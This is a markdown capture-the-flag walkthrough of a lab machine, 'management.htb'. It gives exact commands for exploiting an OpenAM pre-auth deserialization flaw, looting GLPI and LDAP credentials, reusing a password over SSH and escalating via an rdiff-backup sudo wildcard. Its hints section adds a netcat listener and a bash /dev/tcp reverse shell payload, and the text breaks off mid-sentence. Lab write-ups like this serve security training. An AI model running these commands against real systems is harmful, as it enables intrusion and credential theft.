---
title: Walkthrough 10.129.2.188
tags: [walkthrough, ip]
phase: post
target_type: ip
source: self
outcome: worked
date: 2026-11-19
---

# Walkthrough — 10.129.2.188

- Date: 2026-11-19
- Mode: extreme
- Kind: ip

## Steps (exact commands run)

1.   _( recon: confirm services )_
   ```
   $ nmap -p 22,80,443,1689,4444,36713,50389 -sV -Pn --min-rate 1000 10.129.2.188
   22 ssh, 80/443 nginx, 1689 java-rmi, 4444 ldaps, 50389 ldap(anon)
   ```
2.   _( pull vhost from TLS cert )_
   ```
   $ echo | openssl s_client -connect 10.129.2.188:443 -servername management.htb | openssl x509 -noout -subject
   subject=CN=management.htb, O=Management Managed Services Ltd
   ```
3.   _( fix stale /etc/hosts entry (was pointing at an old IP) )_
   ```
   $ sudo sed -i '/management\.htb/d' /etc/hosts; echo '10.129.2.188 management.htb sso.management.htb' | sudo tee -a /etc/hosts
   ```
4.   _( fix: 443 TLS handshake hung over VPN (80 ok) -> lower tun0 MTU )_
   ```
   $ sudo ip link set dev tun0 mtu 1300
   TLS then returned the cert
   ```
5.   _( confirm OpenAM CVE-2026-33439 entry point )_
   ```
   $ curl -sk --resolve sso.management.htb:443:10.129.2.188 -o /dev/null -w '%{http_code}' https://sso.management.htb/openam/ui/PWResetUserValidation
   HTTP 200
   ```
6.   _( get the OpenAM pre-auth RCE PoC (jato.clientSession deserialization) )_
   ```
   $ git clone https://github.com/infernosalex/CVE-2026-33439-Python-PoC
   ```
7.   _( foothold: pre-auth RCE )_
   ```
   $ python3 -I exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
   uid=996(openam) gid=987(openam)
   ```
8.   _( loot GLPI DB creds via RCE )_
   ```
   $ <rce> cat /opt/glpi/config/config_db.php
   dbuser=glpi dbpassword=8rhu0L6Pw4Y7 dbdefault=glpidb
   ```
9.   _( get reversible LDAP bind secret )_
   ```
   $ <rce> mysql -u glpi -p8rhu0L6Pw4Y7 -h 127.0.0.1 glpidb -e 'SELECT name,rootdn,rootdn_passwd FROM glpi_authldaps\G'
   cn=svc-glpi... rootdn_passwd=avrqW65aZWKz...3Pw==
   ```
10.   _( decrypt the LDAP password on-box (GLPI libsodium scheme) )_
   ```
   $ <rce> php: sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(data,nonce,nonce, file_get_contents('/opt/glpi/config/glpicrypt.key'))
   WpczC40GhTbk
   ```
11.   _( lateral: owen reuses the LDAP password -> USER FLAG )_
   ```
   $ sshpass -p 'WpczC40GhTbk' ssh owen@10.129.2.188 'id; cat ~/user.txt'
   uid=1000(owen); user.txt captured
   ```
12.   _( enumerate privesc )_
   ```
   $ ssh owen@10.129.2.188 'sudo -l'
   (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
   ```
13.   _( privesc: wildcard lets us inject a 2nd --restrict-path / (last wins) -> read /root as root )_
   ```
   $ rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/root_backup
   ```
14.   _( ROOT FLAG )_
   ```
   $ cat /tmp/root_backup/root.txt
   root.txt captured
   ```

## Hints used

```
Difficulty: Easy
OS: Linux
1. Reconnaissance
Full port scan

nmap -p- --min-rate=1000 -T4 -Pn <TARGET_IP>

    -p- → scan all 65535 ports
    --min-rate=1000 -T4 → speed it up
    -Pn → skip host discovery (in case ICMP is blocked)

Service/version scan on the open ports

nmap -p 22,80,443,1689,4444,36713,50389 -sVC -Pn <TARGET_IP>

Results:

Port Service Notes 22 SSH OpenSSH 9.6 80/443 nginx redirects to management.htb 1689/36713 Java RMI not used in this path 4444 SSL/LDAPS OpenDJ fingerprint 50389 LDAP Anonymous bind allowed

The SSL certificate on port 443 revealed the hostname management.htb, and the one on 4444 revealed sso.management.htb.
Add the hostnames to /etc/hosts

echo "10.129.244.176 management.htb sso.management.htb" | sudo tee -a /etc/hosts

LDAP anonymous bind check

ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "" -s base "(objectClass=*)" "*" +

This returned the LDAP root DSE, confirming:

    Server: OpenDJ 5.0.3
    Naming context: dc=management,dc=htb

Trying to dump the actual directory tree came back empty — a dead end for now:

ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "dc=management,dc=htb" "(objectClass=*)"

2. Finding the Real Target: OpenAM SSO

Browsing https://management.htb/ → clicking "Client Login" redirected to https://sso.management.htb/which turned out to be an OpenAM login page.

Checking the page source revealed the version: OpenAM 16.0.5.
3. Initial Access: CVE-2026–33439 (OpenAM Pre-Auth RCE)
The vulnerability, explained simply

OpenAM uses an old framework called JATO for some of its UI pages (like the Password Reset page). JATO has a parameter called jato.clientSession that gets deserialised (converted from raw bytes back into a Java object) without any safety checks.

In plain terms: if you can control what bytes get deserialised, you can make the server create arbitrary Java objects — and with the right “gadget chain,” that turns into remote code execution, with no login required.

A previous version of this same bug (jato.pageSession) was patched by adding a whitelist of safe classes. But the fix was incomplete — the sibling parameter jato.clientSession was left unprotected. That's exactly what CVE-2026-33439 is.

    Affected: OpenAM ≤ 16.0.5
    Entry point: /openam/ui/PWResetUserValidation (and other JATO ViewBean pages)

Exploiting it

PoC used: infernosalex/CVE-2026-33439-Python-PoC — a standalone Python exploit, no dependencies needed.

git clone https://github.com/infernosalex/CVE-2026-33439-Python-PoC
cd CVE-2026-33439-Python-PoC

# Test command execution
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'

Result:

uid=996(openam) gid=987(openam) groups=987(openam)

We have unauthenticated RCE as the openam user.
Getting a reverse shell

Start a listener:

nc -lvnp 4444

Send the reverse shell payload:

python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"'

    Note: A plain bash -i >& /dev/tcp/... without wrapping it in bash -c "..." failed with Syntax error: Bad fd number — the command was being run through /bin/sh (dash), which doesn't understand /dev/tcp. Wrapping it in bash -c forces it to run through bash instead.

Stabilise the shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on your own terminal:
stty raw -echo; fg

4. Hunting for Credentials

Basic enumeration showed a /home/owen directory we couldn't access yet, and two interesting applications installed under /opt: OpenAM itself and GLPI (an IT asset management tool).
Dead end: OpenAM’s own config files

OpenAM keeps a keystore (keystore.jceks) that stores some service account passwords, and we were able to read its passwords:

cat /opt/openam/config/openam/.storepass
cat /opt/openam/config/openam/.keypass

We tried dumping the dsameuserpwd and configstorepwd secret keys from the keystore using a small Java program (since the target only had a mini
```

